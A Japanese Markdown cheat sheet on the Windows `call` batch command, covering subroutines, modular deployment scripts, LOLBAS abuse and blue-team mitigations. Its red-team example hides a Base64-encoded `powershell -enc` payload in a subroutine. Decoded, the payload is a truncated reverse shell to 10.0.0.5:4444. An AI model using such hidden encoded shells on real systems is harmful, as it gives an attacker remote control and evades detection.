---
tags:
  - 'call'
  - 'cmd'
  - 'cheatsheet'
title: 'call - バッチファイルから別のバッチファイルを呼び出す'
summary: 'あるバッチプログラムから別のバッチプログラムを呼び出し、呼び出し先の終了後に元のバッチプログラムの処理を続行します。'
related:
  - 'start'
  - 'goto'
---

# `call` - バッチファイルから別のバッチファイルを呼び出す

## 概要

`call` コマンドは、あるバッチファイルの中から別のバッチファイルや、同じファイル内のサブルーチン（ラベル）を呼び出すために使用されます。`call` を使って呼び出すと、呼び出されたスクリプトやサブルーチンの実行が完了した後、呼び出し元の次の行から処理が再開されます。この挙動により、バッチファイルをモジュール化し、構造化されたプログラムを作成することが可能になります。

(出自: `Windows標準搭載`)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 (あれば) |
| :--- | :--- | :--- |
| **直接実行** (`<script>.bat`) | バッチファイル内で `call` を使わずに別のバッチファイルを直接実行すると、処理がその新しいバッチファイルに移り、**呼び出し元には戻ってきません**。 | `call` |
| **`start`** | 新しいコマンドプロンプトウィンドウを**非同期で**開いてコマンドを実行します。元のバッチファイルは、`start` で起動した処理の終了を待たずに次の行に進みます。 | - |
| **`goto`** | 同じバッチファイル内の指定したラベルに**無条件でジャンプ**します。`call` はサブルーチンとして呼び出し、処理が終わると戻ってきます。 | `call` (サブルーチン) |

## よく連携されるコマンド

`call` は、複雑なバッチスクリプトを構造化するために、`if` や `goto`、ラベル構文と密接に連携します。

### シナリオ例: 共通処理のサブルーチン化 (インフラ構築・運用視点)

* **目的**: 複数の箇所で必要となるログ出力処理をサブルーチンとして定義し、必要な時に呼び出す。
* **連携コマンド**: `echo`, `goto`, ラベル (`:`)
* **解説**: `:sub_log` のようなラベルでサブルーチンを定義し、`call :sub_log "メッセージ"` のようにして呼び出します。サブルーチンの終わりでは `goto :eof` を使って呼び出し元に戻ります。
* **コマンド例**:

    ```cmd
    @echo off
    REM メイン処理
    call :sub_log "処理を開始します。"
    REM ... 何らかの処理 ...
    call :sub_log "処理が完了しました。"
    goto :eof

    REM ===== ログ出力サブルーチン =====
    :sub_log
    echo [%date% %time%] %~1 >> process.log
    goto :eof
    ```

## スイッチ/オプション説明

| スイッチ/オプション | 説明 |
| :--- | :--- |
| **`<batchfile>`** | 呼び出すバッチファイルの名前を指定します。 |
| **`:<label>`** | 同じバッチファイル内で、呼び出すサブルーチンのラベル名を指定します。 |
| **`<arguments>`** | 呼び出すバッチファイルやサブルーチンに渡す引数を指定します。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: 複雑なデプロイメントスクリプトを、機能ごとにモジュール化する。
* **組み合わせ**: `call <sub_script>.bat`
* **解説**: `main.bat` から `call setup_network.bat`、`call install_app.bat`、`call configure_firewall.bat` のように、処理の各ステップを個別のバッチファイルに分割します。これにより、スクリプトの可読性、保守性、再利用性が向上します。
* **例**:

    ```cmd
    REM main_deploy.bat の中身
    @echo off
    echo.
    echo --- ネットワーク設定を開始 ---
    call network_setup.bat
    echo.
    echo --- アプリケーションのインストールを開始 ---
    call app_install.bat
    echo.
    echo --- 全ての処理が完了しました ---
    ```

### 2. ブルーチーム視点

* **タスク**: 悪意のあるバッチファイルの動作を分析する。
* **組み合わせ**: (コードレビュー)
* **解説**: 攻撃者はしばしば、悪意のある処理を複数のバッチファイルに分割し、`call` を使ってそれらを呼び出すことで、スクリプトの全体像を把握しにくくします。ブルーチームは、`call` で呼び出されている先のファイルも追跡し、一連の攻撃フローを正確に理解する必要があります。
* **例**: -

### 3. レッドチーム視点

* **タスク**: **防御回避 (Defense Evasion)** のために、悪意のあるスクリプトを難読化・分割する。
* **組み合わせ**: `call :obfuscated_label`
* **解説**: 攻撃者は、悪意のある処理を無関係に見える名前のサブルーチンに隠したり、複数のファイルに分割したりして、静的解析ツールやアンチウイルスによる検知を回避しようと試みます。
* **例**:

    ```cmd
    REM 悪意のあるPowerShellコマンドをサブルーチンに隠す
    @echo off
    call :run_payload
    exit /b

    :run_payload
    powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgA1ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAe...
    goto :eof
    ```

## エラーメッセージとトラブルシューティング

### よくあるエラーメッセージ

1. **エラーメッセージ**: `Label :<label_name> not found.`
    * **考えられる原因**: `call :<label_name>` で指定したラベルが、バッチファイル内に存在しません。
    * **解決策**: ラベル名のスペルが正しいか、コロン `:` で始まるラベルがファイル内に定義されているかを確認してください。

## 環境変数と設定ファイル

* `call` コマンドで呼び出されたバッチファイルは、呼び出し元の環境変数を引き継ぎます。呼び出し先で `setlocal` を使わない限り、環境変数の変更は呼び出し元にも影響します。
* 一般的な環境変数は、[CMD共通の環境変数・設定ファイル](./environment_and_config.md)で解説。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: `call` 自体ではなく、それが呼び出すスクリプトの内容が問題となります。
* **悪用シナリオ**: 攻撃者は、正規のバッチ処理フローに割り込み、`call` を使って悪意のあるスクリプトを途中で実行させるように改ざんする可能性があります。

### LOLBAS (Living Off The Land Binaries and Scripts) における利用例

* **機能**: **防御回避 (Defense Evasion)**
* **解説**: `call` は、スクリプトのロジックを分割・難読化し、静的解析を困難にするために利用されます。

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: スクリプトファイルへの書き込み権限を厳格に管理する。
* **Detection (検知)**: ファイル整合性監視(FIM)ツールで、重要なバッチファイルの変更を監視する。PowerShellのスクリプトブロックロギングや、コマンドライン引数の監査を有効化し、不審なスクリプトの実行を記録する。

## 注意点・補足

* **引数の渡し方**: `call :subroutine arg1 "argument 2"` のようにして引数を渡し、サブルーチン内では `%1`, `%2` で受け取ることができます。`%*` は全ての引数を表します。

---
[CMDインデックスに戻る](../../cmd_index.md)
